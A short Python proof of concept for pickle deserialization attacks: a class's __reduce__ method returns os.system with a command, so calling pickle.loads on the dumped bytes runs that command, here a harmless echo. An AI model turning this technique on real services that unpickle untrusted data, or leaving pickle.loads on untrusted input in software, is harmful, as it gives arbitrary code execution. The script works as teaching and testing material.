import pickle
import os


class PickleKlass(object):

    def __init__(self, argument):
        self.arg = argument

    def __reduce__(self):
        return self.arg.system, ('echo "Hello World"',)


raw = pickle.dumps(PickleKlass(os))
pickle.loads(raw)
